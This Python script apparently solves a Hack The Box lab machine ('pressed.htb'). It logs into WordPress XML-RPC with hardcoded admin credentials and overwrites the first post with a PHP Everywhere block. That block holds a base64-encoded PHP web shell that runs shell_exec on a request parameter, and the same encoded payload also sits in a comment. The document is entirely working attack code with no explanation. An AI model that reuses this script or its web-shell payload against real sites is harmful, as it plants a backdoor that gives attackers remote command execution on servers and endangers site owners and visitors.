#!/usr/bin/python3

from wordpress_xmlrpc import Client
from wordpress_xmlrpc.methods import posts
from pwn import *
from pprint import pprint


if __name__ == "__main__":
    #PD9waHAKICBlY2hvICI8cHJlPiIgICAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWyJjbWQiXSkgICAgLiAgICI8L3ByZT4iOwo/Pgo=
    log.progress("making the authentication...")
    client = Client("http://pressed.htb/xmlrpc.php", "admin", "uhc-jan-finals-2022")
    post = client.call(posts.GetPosts())
    log.info("getting the posts..")

    # print(post[0].link)

    malicious_post = post[0]


    malicious_post.content = '''<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"PD9waHAKICBlY2hvICI8cHJlPiIgICAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWyJjbWQiXSkgICAgLiAgICI8L3ByZT4iOwo/Pgo=","version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'''

    client.call(posts.EditPost(malicious_post.id, malicious_post))



